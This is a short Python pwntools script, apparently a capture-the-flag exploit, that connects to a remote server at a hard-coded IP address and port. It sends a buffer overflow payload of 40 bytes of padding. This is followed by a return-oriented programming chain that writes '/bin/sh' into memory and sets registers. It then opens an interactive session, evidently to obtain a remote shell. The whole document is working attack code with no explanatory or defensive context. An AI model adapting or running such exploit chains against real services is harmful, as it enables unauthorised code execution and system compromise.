from pwn import *

# Author : yuan
# https://30cm.ml

host = "140.115.59.7"
port = 11003

yuan = remote(host,port)

payload = "a"*40



payload += p64(0x0000000000437045) #pop rdx ; ret
payload += "/bin/sh\x00"
payload += p64(0x0000000000401693) #pop rdi ; ret
payload += p64(0x00000000006c010a)
payload += p64(0x000000000042a377) #mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret
#payload += p64(0x0000000000401700) #: xor eax, eax ; ret
#payload += p64(0x0000000000401066)
payload += p64(0x0000000000401693) # : pop rdi ; ret
payload += struct.pack("<Q",0x006c0100)
payload += p64(0x000000000045b365)
payload += "aaaaaaaa"
payload += p64(0x00000000006c0100)





yuan.sendline(payload)

yuan.interactive()
